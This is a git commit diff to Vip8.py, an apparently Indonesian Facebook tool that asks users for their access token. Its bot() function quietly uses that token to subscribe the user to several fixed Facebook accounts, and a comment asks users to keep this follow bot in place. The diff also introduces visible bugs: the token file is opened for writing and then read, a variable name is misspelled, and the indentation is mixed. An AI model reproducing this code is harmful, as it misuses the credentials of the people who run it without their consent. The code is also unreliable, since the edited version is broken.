208ab031060607044f36d90364e219ec838da2ba
Strovmirviaska <104303603+Strv-BOT@users.noreply.github.com>
2022-05-16 13:52:23 +0800

    Update Vip8.py

--- Vip8.py
+++ Vip8.py
@@ -93,7 +93,7 @@ def banner():
 
 def login_lagi():
 		os.system('clear')
-		kontoll()
+		kontol()
 		token = input(' [%s*%s] Masukan Token : '%(O,N))
 		if token in ['']:
 			time.sleep(2);login().login_lagi()
@@ -103,14 +103,16 @@ def login_lagi():
 				open('token.x','w').write(token)
 				print('\n [%s+%s] Login Berhasil %s'%(H,N,cc))
 				bot()
-        except KeyError:
-                print('\n%s[%s!%s] %sToken Invalid'%(M,P,M,P))
-                exit()
+			except KeyError:
+				jalan(' [%s!%s] Token Error Coba Ganti Akun Tumbal'%(M,N))
+				exit()
+	
 # HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
-
 def bot():
 		try:
-			token = open('token.x','r').read()
+			toket = open('token.x','w').read()
+		except IOError:
+			jalan('\n [%s!%s] Token mokad ganti akun!'%(M,N));time.sleep(1);login().login_lagi()
 		requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/100001490081130/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/1517769961/subscribers?access_token=' + toket)
